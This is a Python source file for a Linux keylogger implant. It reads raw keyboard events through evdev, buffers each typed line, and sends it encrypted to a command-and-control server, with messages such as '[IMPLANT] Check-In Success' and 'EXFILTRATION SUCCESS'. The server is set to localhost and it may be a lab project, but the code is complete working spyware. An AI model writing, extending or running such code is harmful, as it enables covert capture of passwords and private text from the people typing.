import sys
import socket
import asyncio
from datetime import UTC, datetime
import httpx
from evdev import InputDevice, ecodes, list_devices
from crypto_vault import CryptoVault
from pydantic_settings import BaseSettings, SettingsConfigDict
from pydantic import Field

SERVER_URL = "http://127.0.0.1:8000"
HOSTNAME = socket.gethostname()
CLIENT_ID = f"linux-{HOSTNAME}"


class Settings(BaseSettings):
    colossus_shared_key: str = Field(default="placeholder_key_if_env_is_missing")
    argus_api_token: str = Field(default="placeholder_key_if_env_is_missing")

    model_config = SettingsConfigDict(env_file=".env", extra="ignore")


settings = Settings()
vault = CryptoVault(settings.colossus_shared_key)

keystroke_buffer = []  # Temporary buffer to pool keystrokes.


def get_keyboard_device():
    devices = [InputDevice(path) for path in list_devices()]
    for device in devices:
        if ecodes.KEY_A in device.capabilities().get(ecodes.EV_KEY, []):
            return device
    return None


# Telemetry Exfiltration Coroutines
async def register_agent(client: httpx.AsyncClient) -> bool:
    """
    Announces the client node presence to the FastApi database mapping layer.
    """
    payload = {"client_id": CLIENT_ID, "hostname": HOSTNAME}
    try:
        res = await client.post("/api/v1/agent/register", json=payload)
        if res.status_code in (200, 201):
            print("[IMPLANT] Check-In Success. Server signature recognized.")
            return True
        print(f"[ERROR] Registry signature rejected: {res.status_code}")
        return False
    except httpx.ConnectError:
        print("[ERROR] C2 offline or unreachable. Exfiltrator staging delayed.")
        return False


async def upload_telemetry(client: httpx.AsyncClient, text_block: str):
    """Encrypts buffered keystrokes and dispatches them across the wire"""
    if not text_block.strip():
        return

    encrypted_payload = vault.encrypt_string(text_block)
    payload = {
        "client_id": CLIENT_ID,
        "timestamp": datetime.now(UTC).isoformat(),
        "encrypted_data": encrypted_payload,
    }

    try:
        res = await client.post("/api/v1/agent/telemetry", json=payload)
        if res.status_code == 202:
            print("[EXFILTRATION SUCCESS] Encrypted bytes flushed over network.")
        else:
            print(f"[ERROR] Server processing anomaly: {res.status_code}")
    except Exception as e:
        print(f"[EXFILTRATION FAILED] Network dropped or timed out: {e}")


# Hardware Listening Engine
async def log_keys(device):
    global keystroke_buffer
    print(f"Intercepting hardware lines: {device.name}")
    print("Press ESC  to server connections...")

    # Establish a persistent async network connection reuse client wrapper
    headers = {"X-Argus-Token": settings.argus_api_token}
    async with httpx.AsyncClient(base_url=SERVER_URL, headers=headers) as client:
        await register_agent(client)

        async for event in device.async_read_loop():
            if event.type != ecodes.EV_KEY:
                continue

            if event.value != 1:
                continue

            if event.code in ecodes.KEY:
                key_name = ecodes.KEY[event.code]
            else:
                continue

            # Core Exit Switch
            if key_name == "KEY_ESC":
                print("\nServering active operational linkages...")
                break

            # Handling special symbols and characters
            elif key_name == "KEY_SPACE":
                keystroke_buffer.append(" ")
            elif key_name == "KEY_BACKSPACE":
                keystroke_buffer.append("[BACKSPACE]")
            elif key_name == "KEY_TAB":
                keystroke_buffer.append("\t")
            elif key_name == "KEY_LEFTSHIFT":
                keystroke_buffer.append("[LEFT_SHIFT]")
            elif key_name == "KEY_RIGHTSHIFT":
                keystroke_buffer.append("[RIGHT_SHIFT]")

            elif key_name == "KEY_ENTER":
                # On press, bundle the buffer string
                line_to_send = "".join(keystroke_buffer)
                keystroke_buffer.clear()

                # Asychronously send the line to the C2 without freezing the key logger.
                asyncio.create_task(upload_telemetry(client, line_to_send))

            else:
                clean_char = str(key_name).replace("KEY_", "").lower()
                if len(clean_char) == 1:
                    keystroke_buffer.append(clean_char)


def main():
    device = get_keyboard_device()
    if not device:
        print("Error: Target input interface absent.", file=sys.stderr)
        print("Administrative sudo execution required.", file=sys.stderr)
        sys.exit(1)

    try:
        asyncio.run(log_keys(device))
    except KeyboardInterrupt:
        print("\nClean manual disconnect achieved.")


if __name__ == "__main__":
    main()
